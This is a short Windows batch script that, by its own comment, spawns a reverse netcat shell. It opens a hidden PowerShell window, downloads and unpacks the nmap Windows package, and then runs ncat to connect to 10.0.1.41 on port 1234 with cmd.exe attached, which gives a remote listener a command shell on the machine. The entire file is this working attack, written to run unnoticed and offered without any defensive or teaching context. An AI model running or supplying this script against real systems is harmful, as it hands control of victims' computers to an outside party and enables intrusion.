:: A very simple script that will spawn a reverse NC shell

:: open a hidden powershell window and download the cmd line zip file from nmap
powershell -windowstyle hidden IWR -Uri https://nmap.org/dist/nmap-7.92-win32.zip -Outfile nmap.zip

:: Expand the zip file 
powershell expand-archive nmap.zip

:: Use the ncat.exe to reach out to the server
powershell ./nmap/nmap-7.92/ncat.exe 10.0.1.41  1234 -e cmd.exe